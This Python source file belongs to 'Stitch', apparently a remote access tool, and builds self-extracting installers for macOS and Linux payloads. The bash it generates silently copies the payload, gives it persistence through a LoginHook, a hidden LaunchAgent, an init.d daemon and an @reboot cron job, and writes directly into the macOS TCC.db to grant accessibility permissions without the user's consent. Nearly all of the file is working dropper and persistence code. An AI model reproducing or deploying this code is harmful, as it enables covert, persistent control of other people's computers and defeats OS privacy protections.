# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import shutil
import subprocess
from globals import *
from payload_setup import *

mkself_path = os.path.join(tools_path,'makeself')
mkself_exe = os.path.join(mkself_path,'makeself.sh')

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}\n".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

#TODO write cross platform install commands
def gen_st_setup(alias,mkself_tmp):
    setup_code = '''#!/bin/bash

osx=false
lnx=false

user="$(logname)"
script_dir="$(dirname $0)"

if [ "$(id -u)" != "0" ]; then
    sudo_rights=false
else
    sudo_rights=true
fi

case "$(uname -s)" in
   Darwin)
        osx=true
    ;;
   Linux)
        lnx=true
    ;;
esac

if [ "$osx" = true ]; then
    trgt="/usr/local/bin"
    su_trgt="/usr/local/sbin"
    plist_trgt="/Users/$user/Library/LaunchAgents"
    if [ ! -d $plist_trgt ]; then
         mkdir -p $plist_trgt
    fi
    if [ "$sudo_rights" = true ]; then
        cp -R $script_dir/{0}.app $su_trgt/{0}.app >> /dev/null 2>&1
        cp $script_dir/onlogin.sh $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        chown -R $(logname) $su_trgt/{0}.app
        chmod +x {0}.app/Contents/MacOS/{0}
        chmod +x $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        cd $su_trgt/{0}.app/Contents/MacOS/
        nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
        defaults write com.apple.loginwindow LoginHook $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL,NULL)" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "UPDATE access SET allowed='1' WHERE client='com.apple.Terminal'" >> /dev/null 2>&1
        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "UPDATE access SET allowed='1' WHERE client='com.apple.loginwindow'" >> /dev/null 2>&1
    else
        cp -R $script_dir/{0}.app $trgt/{0}.app >> /dev/null 2>&1
        chown -R $(logname) {0}.app
        chmod +x {0}.app/Contents/MacOS/{0}
        cp $script_dir/st.plist $plist_trgt/{0}_st.plist >> /dev/null 2>&1
        launchctl load $plist_trgt/{0}_st.plist >> /dev/null 2>&1
    fi
fi

if [ "$lnx" = true ]; then
    trgt="/home/$user"
    su_trgt="/usr/sbin"
    if [ "$sudo_rights" = true ]; then
        cp -R $script_dir/{0} $su_trgt/{0} >> /dev/null 2>&1
        cp $script_dir/su_st_daemon /etc/init.d/{0}_st >> /dev/null 2>&1
        chmod +x $su_trgt/{0}
        chmod +x /etc/init.d/{0}_st
        chkconfig --add {0}_st
        chkconfig --level 2345 {0}_st on
        /etc/init.d/{0}_st start
    else
        cp -R $script_dir/{0} $trgt/{0} >> /dev/null 2>&1
        chmod +x $trgt/{0}
        (crontab -l ;echo "@reboot $trgt/{0} &") | sort - | uniq - | crontab -
        cd $trgt
        nohup $trgt/{0} >> /dev/null 2>&1 &
    fi
fi
'''.format(alias)

    onlogin_code = '''#!/bin/bash
nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
'''.format(alias)

    st_setup = os.path.join(mkself_tmp, 'st_setup.sh')
    with open(st_setup,'w') as s:
        s.write(setup_code)
    st_onlogin = os.path.join(mkself_tmp, 'onlogin.sh')
    with open(st_onlogin,'w') as s:
        s.write(onlogin_code)

def gen_osx_plist(alias,mkself_tmp):
    plist_code = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.{0}.st</string>

    <key>Disabled</key>
    <false/>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>LaunchOnlyOnce</key>
    <true/>

    <key>LSBackgroundOnly</key>
    <string>1</string>

    <key>LSUIElement</key>
    <true/>

    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/bin/{0}.app/Contents/MacOS/{0}</string>
    </array>

    <key>WorkingDirectory</key>
    <string>/</string>
  </dict>
</plist>
'''.format(alias)

    st_plist = os.path.join(mkself_tmp, 'st.plist')
    with open(st_plist, 'w') as s:
        s.write(plist_code)

def gen_lnx_daemon(alias,mkself_tmp):
    su_daemon_code = '''#!/bin/bash
# chkconfig: 2345 80 20

# Source function library.
. /etc/init.d/functions

start() {{
    daemon /usr/sbin/{0} &
}}

stop() {{
    echo
}}

case "$1" in
    start)
       start
       ;;
    stop)
       stop
       ;;
    *)
       echo "Usage: $0 {{start|stop}}"
esac

exit 0
'''.format(alias)

    su_st_daemon = os.path.join(mkself_tmp, 'su_st_daemon')
    with open(su_st_daemon, 'w') as s:
        s.write(su_daemon_code)


def gen_makeself(conf_dir,alias):
    mkself_tmp = os.path.join(conf_dir,'tmp')
    conf_mkself = os.path.join(conf_dir,'Installers')
    if not os.path.exists(conf_mkself):
        os.makedirs(conf_mkself)
    if not os.path.exists(mkself_tmp):
        os.makedirs(mkself_tmp)
    if sys.platform.startswith('darwin'):
        alias_app = os.path.join(conf_dir,'{}.app'.format(alias))
        if os.path.exists(alias_app):
            run_command('cp -R {} {}'.format(alias_app,mkself_tmp))
            gen_osx_plist(alias,mkself_tmp)
            gen_st_setup(alias,mkself_tmp)
            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
            st_log.info(mkself_installer)
            st_log.info(run_command(mkself_installer))
            shutil.rmtree(mkself_tmp)
    else:
        binry_dir = os.path.join(conf_dir,'Binaries')
        alias_dir = os.path.join(binry_dir, alias)
        if os.path.exists(alias_dir):
            run_command('cp -R {} {}'.format(alias_dir,mkself_tmp))
            gen_lnx_daemon(alias,mkself_tmp)
            gen_st_setup(alias,mkself_tmp)
            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
            st_log.info(mkself_installer)
            st_log.info(run_command(mkself_installer))
            shutil.rmtree(mkself_tmp)
